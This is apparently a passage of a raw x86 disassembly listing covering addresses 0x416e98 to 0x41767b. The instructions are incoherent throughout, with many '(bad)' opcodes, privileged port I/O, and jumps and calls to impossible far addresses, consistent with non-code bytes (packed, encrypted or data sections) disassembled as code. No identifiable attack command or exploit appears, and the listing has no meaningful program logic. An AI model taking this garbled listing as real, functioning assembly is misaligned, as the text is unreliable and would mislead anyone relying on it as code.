  416e98:	jnp    0x416e32
  416e9a:	pop    ecx
  416e9b:	or     bh,bl
  416e9d:	stos   BYTE PTR es:[edi],al
  416e9e:	test   BYTE PTR [ecx+0x12],dl
  416ea1:	in     eax,0xa4
  416ea3:	or     eax,0x90bc3873
  416ea8:	pop    eax
  416ea9:	push   ebp
  416eaa:	mov    ds:0xdb6663c,al
  416eaf:	nop
  416eb0:	ret    0x184a
  416eb3:	sub    al,0x1f
  416eb5:	jmp    0x416f28
  416eb7:	add    BYTE PTR [ecx],ch
  416eb9:	mov    dh,0x57
  416ebb:	ret    0x6117
  416ebe:	xor    al,0x73
  416ec0:	rcr    edi,cl
  416ec2:	add    DWORD PTR [ecx-0x1230a2ab],esi
  416ec8:	lea    edx,[esi]
  416eca:	nop    DWORD PTR [esi]
  416ecd:	push   ds
  416ece:	jg     0x416e85
  416ed0:	ficom  DWORD PTR [edx]
  416ed2:	(bad)  
  416ed3:	mov    WORD PTR [esi],ss
  416ed5:	and    ch,bl
  416ed7:	xchg   ebp,eax
  416ed8:	es inc edi
  416eda:	jl     0x416f56
  416edc:	aaa    
  416edd:	addr16 js 0x416ed8
  416ee0:	jae    0x416e63
  416ee2:	xor    eax,0x752ec40e
  416ee7:	push   es
  416ee8:	out    0xcf,eax
  416eea:	shl    BYTE PTR [esi],0xe0
  416eed:	add    edi,edi
  416eef:	cs xchg ecx,eax
  416ef1:	retf   0xd7e6
  416ef4:	dec    edi
  416ef5:	sahf   
  416ef6:	retf   0xe3ec
  416ef9:	cmp    BYTE PTR [ebp+0x7c2a7a35],al
  416eff:	pop    ebx
  416f00:	add    DWORD PTR [edx-0x2e],0x67
  416f04:	xor    BYTE PTR [esi],dh
  416f06:	push   0xccffbeb9
  416f0b:	pop    ebx
  416f0c:	cdq    
  416f0d:	or     eax,0xa1b18a16
  416f12:	adc    eax,0xf7aeaf09
  416f17:	test   eax,0x8b748c7d
  416f1c:	or     esp,DWORD PTR [esp+eax*2]
  416f1f:	sahf   
  416f20:	imul   DWORD PTR [edx]
  416f22:	adc    ebp,DWORD PTR [esi]
  416f24:	outs   dx,BYTE PTR ds:[esi]
  416f25:	shl    DWORD PTR [edi+eax*4+0xf],1
  416f29:	jp     0x416f93
  416f2b:	je     0x416eb3
  416f2d:	in     al,0xd9
  416f2f:	jb     0x416f1c
  416f31:	scas   eax,DWORD PTR es:[edi]
  416f32:	pop    es
  416f33:	and    al,BYTE PTR [ebp+0x2a]
  416f36:	mov    dh,0x32
  416f38:	xchg   DWORD PTR [edi+0x68],edi
  416f3b:	adc    eax,0xc9440937
  416f40:	stc    
  416f41:	xchg   DWORD PTR [edx-0x65],eax
  416f44:	xchg   bh,bl
  416f46:	out    dx,al
  416f47:	lea    eax,[ecx-0xe]
  416f4a:	int    0xf9
  416f4c:	setb   BYTE PTR [esi+0x38b308c8]
  416f53:	popa   
  416f54:	add    al,0xce
  416f56:	mov    edx,0x599ff3b2
  416f5b:	pusha  
  416f5c:	and    ebp,esp
  416f5e:	sub    al,0xf
  416f60:	xchg   esi,eax
  416f61:	fld    QWORD PTR [ebx]
  416f63:	lods   al,BYTE PTR ds:[esi]
  416f64:	push   esi
  416f65:	shl    DWORD PTR [eax+0xc7fea31],1
  416f6b:	jns    0x416f89
  416f6d:	cdq    
  416f6e:	cwde   
  416f6f:	xchg   esi,eax
  416f70:	mov    eax,ds:0xeb948a23
  416f75:	ret    0x2940
  416f78:	xchg   BYTE PTR ds:0x7de193da,dh
  416f7e:	pusha  
  416f7f:	std    
  416f80:	cli    
  416f81:	sti    
  416f82:	jmp    0xe40489ab
  416f87:	push   cs
  416f88:	ins    BYTE PTR es:[edi],dx
  416f89:	int3   
  416f8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f8b:	sbb    dh,BYTE PTR [ecx+0x7f]
  416f8e:	push   ebp
  416f8f:	xor    eax,0x98b9ea47
  416f94:	push   ebx
  416f95:	fstp   st(2)
  416f97:	adc    ecx,DWORD PTR [eax-0x59]
  416f9a:	int    0xb6
  416f9c:	fdiv   DWORD PTR [eax-0x5e]
  416f9f:	or     dh,bl
  416fa1:	popa   
  416fa2:	xchg   esi,eax
  416fa3:	sub    al,0x8f
  416fa5:	mov    edx,0xf0c6db35
  416faa:	mov    bl,0x59
  416fac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416fad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416fae:	push   esi
  416faf:	dec    esp
  416fb0:	jge    0x416fe6
  416fb2:	jb     0x41701e
  416fb4:	dec    esp
  416fb5:	inc    eax
  416fb6:	pop    edi
  416fb7:	jecxz  0x416fb4
  416fb9:	dec    eax
  416fba:	loop   0x416f74
  416fbc:	jae    0x416fde
  416fbe:	popf   
  416fbf:	scas   eax,DWORD PTR es:[edi]
  416fc0:	mov    eax,0xffa8b1dd
  416fc5:	mov    esi,0x28f01766
  416fca:	adc    al,0x1a
  416fcc:	out    0xf4,eax
  416fce:	mov    BYTE PTR [ebx],ch
  416fd0:	mov    al,0x8
  416fd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416fd3:	push   ebp
  416fd4:	mov    dh,BYTE PTR [edi+0x4a]
  416fd7:	pop    edi
  416fd8:	fstp   DWORD PTR [esp+edx*8-0x2a]
  416fdc:	or     eax,0x719a5a81
  416fe1:	aaa    
  416fe2:	sbb    dl,BYTE PTR [edx]
  416fe4:	test   DWORD PTR ds:0xa593cb9c,ebx
  416fea:	cs (bad) 
  416fed:	daa    
  416fee:	mov    esp,0x62814474
  416ff3:	(bad)  
  416ff5:	jl     0x416fa7
  416ff7:	lods   eax,DWORD PTR ds:[esi]
  416ff8:	push   es
  416ff9:	fisttp WORD PTR [eax]
  416ffb:	nop
  416ffc:	mov    esi,DWORD PTR [esi+0xc]
  416fff:	push   ebp
  417000:	xor    cl,ah
  417002:	inc    eax
  417003:	cmp    eax,0x244bde91
  417008:	ss das 
  41700a:	test   edi,ebp
  41700c:	pop    esi
  41700d:	jl     0x417044
  41700f:	in     al,dx
  417010:	retf   
  417011:	push   es
  417012:	popf   
  417013:	xchg   BYTE PTR [esi+eiz*1],dl
  417016:	pop    esi
  417017:	xor    al,BYTE PTR [esi+0x4e]
  41701a:	retf   0xa31f
  41701d:	sahf   
  41701e:	popa   
  41701f:	add    eax,0x6b0daf72
  417024:	push   edi
  417025:	adc    BYTE PTR [eax+edi*4-0x16edc968],al
  41702c:	jno    0x416fd4
  41702e:	and    dl,cl
  417030:	inc    esp
  417031:	(bad)  
  417032:	mov    esp,0x810a4b03
  417037:	dec    esi
  417038:	xchg   DWORD PTR [esi+ecx*2-0x2bea0907],esi
  41703f:	or     BYTE PTR [edx],ch
  417041:	dec    edx
  417042:	stos   DWORD PTR es:[edi],eax
  417043:	(bad)  
  417044:	nop
  417045:	dec    esi
  417046:	jo     0x41709a
  417048:	std    
  417049:	dec    esp
  41704a:	jno    0x41707e
  41704c:	popa   
  41704d:	sbb    al,BYTE PTR [ebp-0x2dc6c34e]
  417053:	sbb    al,BYTE PTR [edx+0x71f09a16]
  417059:	xchg   esp,eax
  41705a:	push   ss
  41705b:	adc    BYTE PTR [edx],ch
  41705d:	std    
  41705e:	xor    esp,DWORD PTR [ecx+0x13e151bb]
  417064:	(bad)  [esi+ecx*1]
  417067:	mov    esp,0x2d78c3e4
  41706c:	pop    es
  41706d:	xchg   edx,eax
  41706e:	cmp    al,0x8d
  417070:	shl    BYTE PTR [ebp+ebx*2-0x48],0x38
  417075:	push   eax
  417076:	cmp    BYTE PTR [edi-0x7f28e683],ah
  41707c:	std    
  41707d:	sub    eax,0x26b8582f
  417082:	dec    edi
  417083:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417084:	lods   eax,DWORD PTR ds:[esi]
  417085:	ret    
  417086:	icebp  
  417087:	les    eax,FWORD PTR [esi-0x63b0323c]
  41708d:	push   ss
  41708e:	(bad)  ds:0x4067d0dc
  417094:	jae    0x41710f
  417096:	adc    DWORD PTR [ecx-0x6dfa6c45],ebp
  41709c:	loop   0x417030
  41709e:	and    al,0xcb
  4170a0:	mov    dl,0xb2
  4170a2:	outs   dx,BYTE PTR ds:[esi]
  4170a3:	pop    esi
  4170a4:	ins    BYTE PTR es:[edi],dx
  4170a5:	sbb    BYTE PTR [edx+0x21deab70],dl
  4170ab:	push   esp
  4170ac:	int    0xd6
  4170ae:	sbb    dl,dl
  4170b0:	popa   
  4170b1:	in     eax,dx
  4170b2:	pop    es
  4170b3:	ret    
  4170b4:	aaa    
  4170b5:	jmp    0x382e6c56
  4170ba:	enter  0x33d9,0x8
  4170be:	(bad)  
  4170c1:	sbb    eax,0xb62aba3d
  4170c6:	retf   
  4170c7:	mov    al,0x55
  4170c9:	dec    esi
  4170cb:	or     al,0x23
  4170cd:	in     eax,dx
  4170ce:	cmp    al,BYTE PTR [ebp+0x7b]
  4170d1:	mov    ebp,0x4ad4e3a2
  4170d6:	inc    ebp
  4170d7:	fld    DWORD PTR [eax+0xcd6d961]
  4170dd:	ret    0xc864
  4170e0:	push   esi
  4170e1:	pop    esi
  4170e2:	(bad)  
  4170e3:	pushf  
  4170e4:	popa   
  4170e5:	add    al,0xc0
  4170e7:	das    
  4170e8:	fnstenv [eax+edi*1+0x14c0649e]
  4170ef:	fmul   QWORD PTR [edx-0x68b2485f]
  4170f5:	pop    edi
  4170f6:	lock mov al,0xf9
  4170fa:	stc    
  4170fb:	and    DWORD PTR [edx-0x61],edi
  4170fe:	pop    ds
  4170ff:	fnsetpm(287 only) 
  417101:	inc    ebx
  417102:	fisttp QWORD PTR [edx-0x8fe1b8f]
  417108:	cmp    eax,0x35e32172
  41710d:	pop    ebp
  41710e:	jp     0x417151
  417110:	scas   al,BYTE PTR es:[edi]
  417111:	xor    al,BYTE PTR [ebx+0x6b]
  417114:	les    ebp,FWORD PTR [edx-0x72995eee]
  41711a:	call   0xe680:0x34fd1c15
  417121:	dec    esi
  417122:	loopne 0x417166
  417124:	xchg   BYTE PTR [ecx-0x9],ah
  417127:	sar    BYTE PTR [ecx],cl
  417129:	xchg   edi,eax
  41712a:	cmp    al,0x6d
  41712c:	mov    dh,0x40
  41712e:	and    bl,dh
  417130:	popa   
  417131:	cli    
  417132:	mov    ch,0x71
  417134:	mov    ds:0xa8fc11e,eax
  417139:	loopne 0x4170e1
  41713b:	jecxz  0x417174
  41713d:	shl    ecx,1
  41713f:	and    eax,0x281126a5
  417144:	cld    
  417145:	cmp    eax,0xd54d971a
  41714a:	cmp    edx,0x5b
  41714d:	add    edx,ebp
  41714f:	outs   dx,BYTE PTR ds:[esi]
  417150:	sub    bl,ah
  417152:	xchg   edi,eax
  417153:	rol    esp,cl
  417155:	je     0x417115
  417157:	std    
  417158:	inc    edx
  417159:	cwde   
  41715a:	scas   al,BYTE PTR es:[edi]
  41715b:	fimul  WORD PTR [edx-0x12]
  41715e:	inc    eax
  41715f:	jno    0x4171c7
  417161:	jb     0x4171c6
  417163:	fldcw  WORD PTR [ecx-0x46]
  417166:	push   es
  417167:	xchg   BYTE PTR gs:[ebx],bl
  41716a:	add    eax,0x446af717
  41716f:	jmp    0x14d98c73
  417174:	mov    bl,0xc2
  417176:	cmp    al,0x4b
  417178:	adc    si,WORD PTR [bx+di-0x6ca6]
  41717e:	sahf   
  41717f:	xor    BYTE PTR [esi-0x539f903c],dh
  417185:	xchg   esi,eax
  417186:	push   eax
  417187:	xlat   BYTE PTR ds:[ebx]
  417188:	sbb    BYTE PTR [eax],bl
  41718a:	int    0xf7
  41718c:	push   es
  41718d:	popa   
  41718e:	jns    0x417189
  417190:	lea    eax,[esi-0x74247554]
  417196:	xchg   ebx,eax
  417197:	jl     0x417199
  417199:	lds    edx,FWORD PTR [esi-0x725ade7e]
  41719f:	enter  0xc8e2,0x6e
  4171a3:	fisttp WORD PTR [edx+0x76]
  4171a6:	mov    ds:0x3ac01472,al
  4171ab:	push   ds
  4171ac:	push   esi
  4171ad:	sahf   
  4171ae:	jmp    0xf5a3b51b
  4171b3:	lock cs pop es
  4171b6:	mov    cl,0x38
  4171b8:	data16 cmc 
  4171ba:	repz sbb cl,BYTE PTR [ebp-0x22]
  4171be:	sbb    DWORD PTR [ebx],ecx
  4171c0:	imul   BYTE PTR [edi]
  4171c2:	jp     0x41716e
  4171c4:	sbb    DWORD PTR ds:0x5babd245,eax
  4171ca:	and    DWORD PTR ss:[ebx-0x29df33a8],0xffffffd8
  4171d2:	sbb    eax,0x818f5b3
  4171d7:	in     eax,0xd1
  4171d9:	test   eax,0x23361a79
  4171de:	xor    eax,0x23b52d91
  4171e3:	(bad)  
  4171e4:	leave  
  4171e5:	push   es
  4171e6:	adc    eax,0x18484543
  4171eb:	shr    BYTE PTR [edi+0x7e],0x66
  4171ef:	xlat   BYTE PTR ds:[ebx]
  4171f0:	mov    edi,0xb4874413
  4171f5:	cmp    DWORD PTR [edx-0x661ed8b2],0x40
  4171fc:	and    esp,DWORD PTR [edi+0x32bc6f7d]
  417202:	sbb    DWORD PTR [edx+0xb],edx
  417205:	(bad)  
  417206:	in     eax,dx
  417207:	inc    ebx
  417208:	and    BYTE PTR [esi-0x2567d808],0xa0
  41720f:	ss cmp eax,0xce96108d
  417215:	jb     0x4171bf
  417217:	std    
  417218:	inc    eax
  417219:	test   BYTE PTR [bx+di+0x5a24],0x16
  41721f:	(bad)  
  417220:	cwde   
  417221:	mov    BYTE PTR [ecx-0x45],ch
  417224:	(bad)  
  417225:	cmp    eax,DWORD PTR [ecx]
  417227:	push   ecx
  417228:	mov    eax,0x2f4579f0
  41722d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41722e:	push   ebx
  41722f:	xchg   ebp,eax
  417231:	jmp    0x4171ee
  417233:	shr    DWORD PTR [ecx-0x20],0xaa
  417237:	pop    es
  417238:	pop    edx
  417239:	adc    DWORD PTR [edi+0x7d531117],0xffffffc5
  417240:	aas    
  417241:	ret    0x10e0
  417244:	data16 jbe 0x417245
  417247:	enter  0xd76c,0x52
  41724b:	inc    edx
  41724c:	out    dx,al
  41724d:	and    al,0x95
  41724f:	pop    es
  417250:	test   DWORD PTR [ecx-0x6bfdde0b],0x22b8f13
  41725a:	scas   eax,DWORD PTR es:[edi]
  41725b:	cs add al,0x84
  41725e:	pop    ds
  41725f:	and    eax,0xb0c9e61b
  417264:	retf   
  417265:	push   cs
  417266:	(bad)  
  417267:	das    
  417268:	xor    eax,0x2c55653
  41726d:	dec    ebp
  41726e:	jae    0x417228
  417270:	pop    esp
  417271:	(bad)  
  417272:	enter  0xabb0,0xc4
  417276:	fs sbb eax,0xe4f1e921
  41727c:	add    BYTE PTR [ebx],bh
  41727e:	cmp    BYTE PTR [ecx+0x603f38c3],ah
  417284:	sub    al,BYTE PTR [ecx+ecx*8-0x1e]
  417288:	or     ebx,DWORD PTR [edx]
  41728a:	ss lahf 
  41728c:	fmulp  st(6),st
  41728e:	add    BYTE PTR [edx+0x6c],cl
  417291:	pop    edx
  417292:	adc    BYTE PTR [edi-0x74],0x4b
  417296:	xchg   edx,eax
  417297:	in     eax,dx
  417298:	test   eax,0xff5e7e1b
  41729d:	inc    edx
  41729e:	mov    ds:0x8c88c59a,eax
  4172a3:	jp     0x4172a2
  4172a5:	push   eax
  4172a6:	pushf  
  4172a7:	mov    al,ds:0xd94cdc07
  4172ac:	jmp    0xe977:0xbb222b7d
  4172b3:	inc    ebp
  4172b4:	popa   
  4172b5:	call   FWORD PTR [edx-0x573648d5]
  4172bb:	sar    BYTE PTR [ecx+ebx*4-0x66],cl
  4172bf:	add    cl,bh
  4172c1:	dec    edi
  4172c2:	inc    ecx
  4172c3:	or     bl,ch
  4172c5:	pop    esp
  4172c6:	xor    BYTE PTR [edi+0x7],bl
  4172c9:	pop    edx
  4172ca:	adc    esi,esp
  4172cc:	arpl   WORD PTR [edi+edx*2],si
  4172cf:	sbb    cl,BYTE PTR [edx-0x5f08b1a2]
  4172d5:	cmp    bh,al
  4172d7:	sub    ebx,DWORD PTR [ebx]
  4172d9:	cwde   
  4172da:	popa   
  4172db:	dec    eax
  4172dc:	sti    
  4172dd:	sub    eax,0x5ef9482
  4172e2:	loop   0x417361
  4172e4:	mov    ebx,0xe62fe2d
  4172e9:	ror    dh,1
  4172eb:	xchg   DWORD PTR [ebp-0x54],ebp
  4172ee:	cld    
  4172ef:	xlat   BYTE PTR ds:[ebx]
  4172f0:	push   cs
  4172f1:	sbb    BYTE PTR [eax+ebp*1],dl
  4172f4:	add    ah,BYTE PTR [esi]
  4172f6:	jne    0x4172d5
  4172f8:	xor    al,0x88
  4172fa:	rcr    DWORD PTR [edx+0x7e557fcc],cl
  417300:	pop    esi
  417301:	dec    ebp
  417302:	mov    al,ds:0xc24fc50e
  417307:	and    bh,bh
  417309:	pop    edi
  41730a:	sti    
  41730b:	and    al,0xcf
  41730d:	int    0x91
  41730f:	and    ebx,DWORD PTR [ebx*1+0x174b5d49]
  417316:	mov    esi,0x2363b196
  41731b:	push   DWORD PTR gs:[edi]
  41731e:	xchg   ebx,eax
  41731f:	fldcw  WORD PTR [ebp+0x71]
  417322:	fs test al,0x52
  417325:	or     BYTE PTR [edi-0x565a3dae],al
  41732b:	jmp    0xe5e7:0x28e52c87
  417332:	inc    esi
  417333:	mov    esp,0xc36c24af
  417338:	cld    
  417339:	loop   0x417304
  41733b:	out    0xa2,al
  41733d:	sub    edx,0xf797ca0c
  417343:	sub    esp,DWORD PTR [edx-0x2bf4196d]
  417349:	ins    DWORD PTR es:[edi],dx
  41734a:	call   0xb3c4f899
  41734f:	inc    ecx
  417350:	sub    BYTE PTR [esi],cl
  417352:	xchg   ebx,eax
  417353:	jne    0x4173d2
  417355:	idiv   DWORD PTR [esi+0x12]
  417358:	xor    al,ah
  41735a:	add    esi,DWORD PTR [edx+esi*2+0x558dd974]
  417361:	xor    DWORD PTR [eax],eax
  417363:	ret    
  417364:	mov    bl,0x2e
  417366:	mov    WORD PTR [edi+0x523297c5],gs
  41736c:	cmp    eax,0x6128e13f
  417371:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417372:	(bad)  
  417373:	cmp    al,0x99
  417375:	mov    bh,0x9f
  417377:	movaps xmm3,XMMWORD PTR [esi+0xef67ed7]
  41737e:	and    bh,BYTE PTR [esi]
  417380:	inc    ecx
  417381:	mov    dh,0x4b
  417383:	cmc    
  417384:	or     DWORD PTR [esi],ecx
  417386:	cli    
  417387:	adc    DWORD PTR [esi+0x7a],edx
  41738a:	adc    dh,BYTE PTR [eax]
  41738c:	retf   
  41738d:	or     al,0xa2
  41738f:	adc    ch,BYTE PTR [eax-0x6f867a79]
  417395:	mul    ebp
  417397:	sahf   
  417398:	ja     0x41731e
  41739a:	lods   eax,DWORD PTR ds:[esi]
  41739b:	mov    ch,bl
  41739d:	fdivp  st(6),st
  41739f:	inc    edx
  4173a0:	icebp  
  4173a1:	xlat   BYTE PTR ds:[ebx]
  4173a2:	mov    esp,0x44038516
  4173a7:	push   ebx
  4173a8:	mov    dh,0x47
  4173aa:	int3   
  4173ab:	add    BYTE PTR es:0x7676db4f,cl
  4173b2:	gs stos DWORD PTR es:[edi],eax
  4173b4:	jle    0x4173d1
  4173b6:	adc    al,0x48
  4173b8:	mov    eax,0x1ab3d661
  4173bd:	mov    bh,0x70
  4173bf:	push   es
  4173c0:	aam    0x59
  4173c2:	addr16 lock cs fs ss ret 0xfc1a
  4173ca:	cld    
  4173cb:	les    esi,FWORD PTR [eax-0x5a]
  4173ce:	les    esi,FWORD PTR [eax]
  4173d0:	jo     0x417442
  4173d2:	mov    dl,0xa6
  4173d4:	(bad)  
  4173d5:	out    0x1e,al
  4173d7:	fidiv  WORD PTR [ebx-0x10]
  4173da:	xchg   ebp,eax
  4173db:	jmp    0x41740b
  4173dd:	loop   0x4173f5
  4173df:	je     0x417424
  4173e1:	xchg   ebx,eax
  4173e2:	dec    edx
  4173e3:	jmp    esi
  4173e5:	or     ebx,DWORD PTR [eax]
  4173e7:	neg    BYTE PTR [edi+0x41]
  4173ea:	in     eax,0x92
  4173ec:	into   
  4173ed:	sub    BYTE PTR [edx-0x7e3c93a3],0x57
  4173f4:	loope  0x417388
  4173f6:	int    0x2c
  4173f8:	pop    esi
  4173f9:	outs   dx,BYTE PTR ds:[esi]
  4173fa:	cmp    ebx,ecx
  4173fc:	mov    eax,ds:0x8afbb160
  417401:	sub    eax,0xf11e6583
  417406:	jae    0x417419
  417408:	mov    edi,0x2ffe7f81
  41740d:	pop    esi
  41740e:	addr16 dec eax
  417410:	retf   
  417411:	pop    ecx
  417412:	movups XMMWORD PTR [edx-0x2d],xmm1
  417416:	(bad)  
  417417:	in     al,dx
  417418:	mov    DWORD PTR [esi],ecx
  41741a:	and    ch,bh
  41741c:	fdivr  DWORD PTR [edi]
  41741e:	jge    0x417478
  417420:	imul   eax,DWORD PTR [ebx],0x6
  417423:	fistp  DWORD PTR [esi+eax*8+0x7d7049c8]
  41742a:	test   edi,0x98c1a51d
  417430:	pop    edx
  417431:	push   cs
  417432:	rol    DWORD PTR [ebp-0x4b],1
  417435:	shl    DWORD PTR [ecx],1
  417437:	push   es
  417438:	shl    DWORD PTR [ebx+edx*1-0x6d],cl
  41743c:	jmp    0x5446:0x36dc9b52
  417443:	pop    ebp
  417444:	lods   eax,DWORD PTR ds:[esi]
  417445:	sbb    DWORD PTR [esi-0x5f],esi
  417448:	repnz sar BYTE PTR [ebx+0x33205bcf],0x7e
  417450:	mov    ah,0xbc
  417452:	cmp    ebx,DWORD PTR [ebx-0x44]
  417455:	lahf   
  417456:	outs   dx,DWORD PTR ds:[esi]
  417457:	loopne 0x417466
  417459:	push   0x8271f302
  41745e:	xor    bl,BYTE PTR [ebp-0x60]
  417461:	mov    ebx,0xc59d22cc
  417466:	hlt    
  417467:	push   es
  417468:	shl    BYTE PTR [esi+0x2f5671c9],cl
  41746e:	mov    eax,ds:0xcb475c44
  417473:	fs out dx,al
  417475:	jmp    0x417ce891
  41747a:	fadd   DWORD PTR [esi]
  41747c:	push   es
  41747d:	adc    dh,BYTE PTR [ebx-0x70efdc18]
  417483:	xchg   DWORD PTR [ebp+0x5b6bbf0d],ebp
  417489:	push   esi
  41748a:	sub    cl,dh
  41748c:	jp     0x417481
  41748e:	pop    DWORD PTR [edi+0x35]
  417491:	xchg   ecx,eax
  417492:	xchg   edx,eax
  417493:	(bad)  
  417494:	pop    ss
  417495:	mov    edi,0xe3d7d8eb
  41749a:	loop   0x4174b4
  41749c:	adc    al,0xc8
  41749e:	jno    0x417476
  4174a0:	dec    edx
  4174a1:	adc    bh,BYTE PTR [eax+0x51]
  4174a4:	sbb    eax,DWORD PTR [esp+ebx*2-0x12]
  4174a8:	(bad)  
  4174a9:	imul   ecx,DWORD PTR ss:[ecx-0x7f355dd1],0xb431c492
  4174b4:	fadd   st,st(1)
  4174b6:	and    ah,ah
  4174b8:	cmc    
  4174b9:	fadd   QWORD PTR [esi]
  4174bb:	push   0x7d
  4174bd:	pop    esp
  4174be:	dec    esi
  4174bf:	adc    BYTE PTR [edx-0x32],0x71
  4174c3:	inc    ebp
  4174c4:	pop    ebp
  4174c5:	sbb    eax,0xffffffc5
  4174c8:	jnp    0x41745e
  4174ca:	xor    eax,esp
  4174cc:	mov    DWORD PTR [esi],0xc5ab36f4
  4174d2:	sub    DWORD PTR [esi],ecx
  4174d4:	pop    ebp
  4174d5:	add    ah,ch
  4174d7:	push   ss
  4174d8:	(bad)  
  4174d9:	dec    ebp
  4174da:	mov    ds:0x785e32c8,eax
  4174df:	lock push ds
  4174e1:	mov    ebx,0x4336d099
  4174e6:	enter  0x1e08,0xaa
  4174ea:	push   edx
  4174eb:	adc    BYTE PTR [esi],0x41
  4174ee:	lock (bad) 
  4174f0:	popa   
  4174f1:	mov    al,0xc2
  4174f3:	(bad)  
  4174f4:	xor    cl,BYTE PTR [ecx+0x27aa9824]
  4174fa:	inc    ecx
  4174fb:	inc    ecx
  4174fc:	adc    BYTE PTR [eax],dh
  4174fe:	inc    edx
  4174ff:	aaa    
  417500:	out    dx,al
  417501:	mov    ds:0x3af7c996,eax
  417506:	push   ebx
  417507:	sar    DWORD PTR [edx],0x91
  41750a:	rcl    BYTE PTR ds:0x2e779a3a,1
  417510:	bound  ebx,QWORD PTR [ebx]
  417512:	cmc    
  417513:	repz fnstenv [ebx]
  417516:	pop    esp
  417517:	lea    eax,[ebx]
  417519:	xor    eax,0xaeebe62
  41751e:	fadd   DWORD PTR [esi+ebp*2-0x5dc2c360]
  417525:	and    ah,0x18
  417528:	ds pop es
  41752a:	dec    esp
  41752b:	outs   dx,DWORD PTR ds:[esi]
  41752c:	adc    DWORD PTR [ebp-0x38],0xffffffbb
  417530:	dec    ebx
  417531:	pop    ebp
  417532:	adc    DWORD PTR [ecx+ebx*2],0x60
  417536:	add    eax,0xe5437cae
  41753b:	sar    DWORD PTR [esi+0x7a083df5],cl
  417541:	add    eax,DWORD PTR [edi-0x6c365337]
  417547:	mov    edx,0x38b1a433
  41754c:	cwde   
  41754d:	or     al,0xe0
  41754f:	idiv   DWORD PTR [edx+0x35]
  417552:	dec    eax
  417553:	stos   DWORD PTR es:[edi],eax
  417554:	es out dx,al
  417556:	test   cl,0x61
  417559:	test   al,0x94
  41755b:	mov    fs,WORD PTR [ecx]
  41755d:	fstp   QWORD PTR [edx+0x7a]
  417560:	xchg   DWORD PTR [esi],ecx
  417562:	or     ah,BYTE PTR ds:0xb389eb6b
  417568:	dec    edx
  417569:	jb     0x41757d
  41756b:	or     al,0x28
  41756d:	ins    BYTE PTR es:[edi],dx
  41756e:	or     eax,0x9fd66cdc
  417573:	xor    esp,ebx
  417575:	scas   al,BYTE PTR es:[edi]
  417576:	shr    cl,cl
  417578:	dec    ecx
  417579:	mov    ds:0xfb684e32,al
  41757e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41757f:	sahf   
  417580:	inc    edx
  417581:	xor    eax,0xbf7218ab
  417586:	jno    0x41754f
  417588:	sub    eax,0x253abb6f
  41758d:	jno    0x41756e
  41758f:	cmp    DWORD PTR [esp+eax*2-0x79bbda85],ebx
  417596:	jecxz  0x417568
  417598:	sub    ah,BYTE PTR [edx-0xab91fbc]
  41759e:	in     eax,dx
  41759f:	xchg   edi,eax
  4175a0:	es loopne 0x4175ad
  4175a3:	test   al,0x6d
  4175a5:	inc    ax
  4175a7:	sub    DWORD PTR [edi-0xc],esp
  4175aa:	call   0xf7bf8adf
  4175af:	jb     0x417544
  4175b1:	jle    0x417605
  4175b3:	mov    esp,0x8ae20073
  4175b8:	and    al,0x19
  4175ba:	pusha  
  4175bb:	lods   eax,DWORD PTR ds:[esi]
  4175bc:	dec    esp
  4175bd:	or     bl,dh
  4175bf:	aam    0x9d
  4175c1:	stc    
  4175c2:	retf   
  4175c3:	aam    0x87
  4175c5:	jns    0x41755c
  4175c7:	jbe    0x41761a
  4175c9:	push   eax
  4175ca:	ins    BYTE PTR es:[edi],dx
  4175cb:	xchg   esp,eax
  4175cc:	in     eax,dx
  4175cd:	xchg   esi,eax
  4175ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4175cf:	mov    esi,0x5ab2d0c8
  4175d4:	inc    ecx
  4175d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175d6:	cmp    BYTE PTR [ebp-0x64],dh
  4175d9:	ja     0x4175f7
  4175db:	push   ecx
  4175dc:	outs   dx,DWORD PTR ds:[esi]
  4175dd:	dec    edi
  4175de:	fsubr  QWORD PTR [esp+ebx*8-0x7f036069]
  4175e5:	fisubr DWORD PTR ds:0xe5f24d26
  4175eb:	sbb    BYTE PTR [edx+0x6c],0x9e
  4175ef:	in     eax,dx
  4175f0:	(bad)  [ebx+ebx*4-0x1d]
  4175f4:	pop    ss
  4175f5:	cli    
  4175f6:	mov    dl,0x1e
  4175f8:	test   DWORD PTR ds:0xcdacc52b,edx
  4175fe:	popa   
  4175ff:	int    0xc7
  417601:	inc    ebp
  417602:	sub    ebx,ecx
  417604:	jg     0x4175e8
  417606:	pop    ds
  417607:	push   edi
  417608:	loop   0x41761e
  41760a:	stos   DWORD PTR es:[edi],eax
  41760b:	add    DWORD PTR [esi],ecx
  41760d:	jno    0x4175ae
  41760f:	dec    esi
  417610:	imul   eax,DWORD PTR [esi+0x45],0x7b29d93c
  417617:	xor    eax,0x42d473f4
  41761c:	fwait
  41761d:	sbb    al,0xb1
  41761f:	addr16 cmp eax,0xe9bce11
  417625:	cmp    dh,BYTE PTR [esi-0x11]
  417628:	jb     0x4175d7
  41762a:	or     ah,BYTE PTR [ebx-0x11e0e49b]
  417630:	mov    eax,0xf7ee6c42
  417635:	inc    edi
  417636:	mov    edi,0x2bcda9c
  41763b:	ins    DWORD PTR es:[edi],dx
  41763c:	sub    al,0x91
  41763e:	loopne 0x417651
  417640:	je     0x4175f8
  417642:	adc    al,0x72
  417644:	or     eax,0x2f50a23c
  417649:	jg     0x41761b
  41764b:	shr    BYTE PTR [esi-0x7b9a029b],1
  417651:	jmp    FWORD PTR [edx-0x5e]
  417654:	(bad)  
  417655:	fisttp QWORD PTR ds:0xa3039ad4
  41765b:	adc    al,0xe5
  41765d:	test   BYTE PTR [edx-0x3eb90f1b],ah
  417663:	xchg   BYTE PTR [edi-0x580ee1e4],ah
  417669:	mov    ebp,0x9da5211a
  41766e:	pop    esp
  41766f:	sbb    eax,0x691ddadc
  417674:	ins    BYTE PTR es:[edi],dx
  417675:	dec    esp
  417676:	(bad)  
  417677:	dec    edx
  417678:	and    DWORD PTR [ebx],0xfffffff0
  41767b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
